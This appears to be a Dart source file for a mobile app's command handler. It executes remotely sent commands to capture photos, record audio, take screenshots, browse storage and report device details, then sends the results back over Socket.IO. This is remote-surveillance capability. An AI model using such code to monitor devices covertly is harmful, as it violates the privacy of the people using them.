import '../../core/utils/logger.dart';
import '../models/enums.dart';
import '../../models/command_model.dart';
import '../../models/command_result_model.dart';
import '../../services/socket_io_service.dart';
import 'camera_service.dart';
import 'microphone_service.dart';
import 'flashlight_service.dart';
import 'storage_service.dart';
import 'screen_service.dart';
import 'device_info_service.dart';

class CommandHandler {
  static final CommandHandler _instance = CommandHandler._();
  factory CommandHandler() => _instance;
  CommandHandler._();

  final _camera = CameraService();
  final _mic = MicrophoneService();
  final _flash = FlashlightService();
  final _storage = StorageService();
  final _screen = ScreenService();
  final _deviceInfo = DeviceInfoService();

  Future<void> handleCommand(CommandModel command) async {
    AppLogger.i('CommandHandler', 'Handling: ${command.action}');

    command.status = CommandStatus.executing;

    try {
      CommandResult result;

      switch (command.action) {
        // Camera
        case 'camera.capture':
          result = await _camera.capture({...command.payload, 'commandId': command.commandId});
          break;

        // Microphone
        case 'mic.record_start':
          result = await _mic.startRecording({...command.payload, 'commandId': command.commandId});
          break;
        case 'mic.record_stop':
          result = await _mic.stopRecording({...command.payload, 'commandId': command.commandId});
          break;

        // Flashlight
        case 'flash.on':
          result = await _flash.turnOn({...command.payload, 'commandId': command.commandId});
          break;
        case 'flash.off':
          result = await _flash.turnOff({...command.payload, 'commandId': command.commandId});
          break;
        case 'flash.toggle':
          result = await _flash.toggle({...command.payload, 'commandId': command.commandId});
          break;
        case 'flash.blink':
          result = await _flash.blink({...command.payload, 'commandId': command.commandId});
          break;
        case 'flash.sos':
          result = await _flash.sos({...command.payload, 'commandId': command.commandId});
          break;

        // Storage
        case 'storage.browse':
          result = await _storage.browse({...command.payload, 'commandId': command.commandId});
          break;
        case 'storage.file_info':
          result = await _storage.getFileInfo({...command.payload, 'commandId': command.commandId});
          break;

        // Screen
        case 'screen.capture':
          result = await _screen.capture({...command.payload, 'commandId': command.commandId});
          break;

        // Device Info
        case 'device.info':
          final info = await _deviceInfo.getDeviceInfo();
          result = CommandResult.success({...info.toJson(), 'commandId': command.commandId});
          break;
        case 'device.ping':
          result = CommandResult.success({
            'commandId': command.commandId,
            'pong': true,
            'timestamp': DateTime.now().millisecondsSinceEpoch,
          });
          break;

        default:
          result = CommandResult.failure(command.commandId, 'unknown_command: ${command.action}');
      }

      if (result.success) {
        command.status = CommandStatus.success;
        command.resultSummary = _summarizeSuccess(command.action, result);
        command.resultData = result.data;
      } else {
        command.status = CommandStatus.error;
        command.resultSummary = result.error ?? 'Unknown error';
      }
      command.completedAt = DateTime.now();

      // Send result back via Socket.IO
      SocketIOService().sendCommandResult(result);
      AppLogger.i('CommandHandler', 'Result sent for ${command.commandId}');
    } catch (e) {
      AppLogger.e('CommandHandler', 'Command execution failed', e);
      command.status = CommandStatus.error;
      command.resultSummary = 'Exception: ${e.toString()}';
      command.completedAt = DateTime.now();
      SocketIOService().sendCommandError(command.commandId, e.toString());
    }
  }

  String _summarizeSuccess(String action, CommandResult result) {
    switch (action) {
      case 'camera.capture':
        final size = result.data['image_size_bytes'] as int? ?? 0;
        return 'Photo captured (${(size / 1024).toStringAsFixed(1)} KB)';
      case 'mic.record_start':
        return 'Recording started';
      case 'mic.record_stop':
        final size = result.data['audio_size_bytes'] as int? ?? 0;
        return 'Recording stopped (${(size / 1024).toStringAsFixed(1)} KB)';
      case 'flash.on':
        return 'Flashlight on';
      case 'flash.off':
        return 'Flashlight off';
      case 'flash.toggle':
        return 'Flashlight toggled';
      case 'flash.blink':
        return 'Blinking pattern started';
      case 'flash.sos':
        return 'SOS pattern started';
      case 'storage.browse':
        final total = result.data['total'] as int? ?? 0;
        return 'Listed $total items';
      case 'screen.capture':
        return 'Screen captured';
      case 'device.info':
        return 'Device info sent';
      case 'device.ping':
        return 'Pong';
      default:
        return 'Executed: $action';
    }
  }
}